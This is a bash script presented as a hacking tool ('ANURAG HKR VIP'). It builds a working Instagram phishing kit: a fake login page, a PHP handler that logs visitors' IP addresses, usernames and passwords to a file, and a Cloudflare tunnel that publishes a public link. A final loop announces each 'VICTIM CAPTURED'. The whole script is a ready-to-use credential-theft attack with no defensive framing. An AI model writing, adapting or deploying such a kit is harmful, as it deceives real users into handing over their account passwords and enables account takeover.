#!/bin/bash

# --- 1. SETUP COLORS ---
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# --- CLEANUP TRAP (Auto Close Port) ---
cleanup() {
    echo -e "\n${RED}[!] Stopping Services...${RESET}"
    if [[ ! -z "$PHP_PID" ]]; then kill $PHP_PID > /dev/null 2>&1; fi
    if [[ ! -z "$CF_PID" ]]; then kill $CF_PID > /dev/null 2>&1; fi
    # Port Kill
    fuser -k $PORT/tcp > /dev/null 2>&1
    rm -f cloud.log
    echo -e "${GREEN}[✔] Exiting cleanly.${RESET}"
    exit
}
trap cleanup SIGINT SIGTERM

# --- 2. BANNER ---
clear
echo -e "${BLUE}"
cat << "EOF"
    _    _   _ _   _ ____       _    ____    _   _ _   _______  
   / \  | \ | | | | |  _ \     / \  / ___|  | | | | |/ /  _ \ 
  / _ \ |  \| | | | | |_) |   / _ \| |  _    | |_| | ' /| |_) |
 / ___ \| |\  | |_| |  _ <   / ___ \ |_| |  |  _  | . \|  _ < 
/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
                                                              
EOF
echo -e "${RESET}"
echo -e "${CYAN}[+] Tool      : ${YELLOW}ANURAG HKR VIP${RESET}"
echo -e "${CYAN}[+] Status    : ${GREEN}FIXED VERSION${RESET}"
echo ""

# --- 3. SMART PORT SELECTION (Your Request) ---
echo -ne "${YELLOW}[?] Want Custom Port? (y/n): ${RESET}"
read -r choice

if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    echo -ne "${CYAN}    >> Enter Port Number: ${RESET}"
    read USER_PORT
    PORT=${USER_PORT:-8080} # Agar khali chhoda to 8080
else
    echo -e "${GREEN}    >> Auto-setting Port to 8080...${RESET}"
    PORT=8080
fi

# Port Clean before start
fuser -k $PORT/tcp > /dev/null 2>&1

# --- 4. SETUP FILES ---
rm -rf auth/ cloud.log
mkdir -p auth
touch usernames.txt

# --- 5. HTML CODE (Instagram) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
body{background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{width:350px;text-align:center;}
.input{width:100%;padding:12px;margin:5px 0;background:#121212;border:1px solid #333;color:#fff;border-radius:4px;}
.btn{width:100%;padding:10px;background:#0095f6;border:none;color:#fff;border-radius:4px;font-weight:bold;margin-top:10px;cursor:pointer;}
</style>
</head>
<body>
<div class="card">
    <img src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png" width="60" style="margin-bottom:20px;">
    <h2>Instagram</h2>
    <form action="login.php" method="POST">
        <input class="input" type="text" name="username" placeholder="Phone number, username, or email" required>
        <input class="input" type="password" name="password" placeholder="Password" required>
        <button class="btn" type="submit">Log in</button>
    </form>
    <p style="margin-top:20px;color:#888;">Forgot password?</p>
</div>
</body>
</html>
EOF

cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "IP: " . \$_SERVER['REMOTE_ADDR'] . " | User: " . \$_POST['username'] . " | Pass: " . \$_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. START PHP SERVER ---
echo -e "${BLUE}[*] Starting Localhost on Port $PORT...${RESET}"
php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

# --- 7. CLOUDFLARE LINK FIX ---
echo -e "${YELLOW}[*] Starting Cloudflare Tunnel...${RESET}"

# Download Check
if [[ ! -f "cloudflared" ]]; then
    echo -e "${CYAN}    >> Downloading Cloudflare Binary...${RESET}"
    # Auto Detect Architecture
    if [[ $(uname -m) == "aarch64" ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    else
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    fi
    chmod +x cloudflared
fi

# Run Cloudflare
rm -f cloud.log
./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
CF_PID=$!

# --- 8. LINK GENERATION LOOP (THE FIX) ---
echo -ne "${GREEN}[*] Generating Link (Please Wait)... ${RESET}"

# Loop 10 times to check for link (Wait up to 20 seconds)
found=0
for i in {1..10}; do
    sleep 2
    if grep -q "trycloudflare.com" cloud.log; then
        URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cloud.log | head -n 1)
        found=1
        break
    fi
    echo -ne "."
done

echo "" # New line

if [[ $found -eq 1 ]]; then
    echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"
    echo -e "${GREEN}[✔] SUCCESS! YOUR LINK IS READY:${RESET}"
    echo -e "${YELLOW}    $URL${RESET}"
    echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"
else
    echo -e "${RED}[!] Link Generation Failed!${RESET}"
    echo -e "${YELLOW}Tip: Check your internet or try turning Flight Mode ON/OFF.${RESET}"
    echo -e "${YELLOW}Debug: Check 'cloud.log' file for errors.${RESET}"
    
    # Show last few lines of log for debugging
    echo -e "${RED}--- LOG START ---${RESET}"
    tail -n 5 cloud.log
    echo -e "${RED}--- LOG END ---${RESET}"
fi

# --- 9. MONITORING ---
echo -e "\n${RED}[*] Waiting for Victims... (Ctrl+C to Stop)${RESET}"
tail -n 0 -f usernames.txt | while read line; do
    echo -e "${GREEN}[+] VICTIM CAPTURED: ${RESET}$line"
    echo -e "\a" # Beep Sound
done
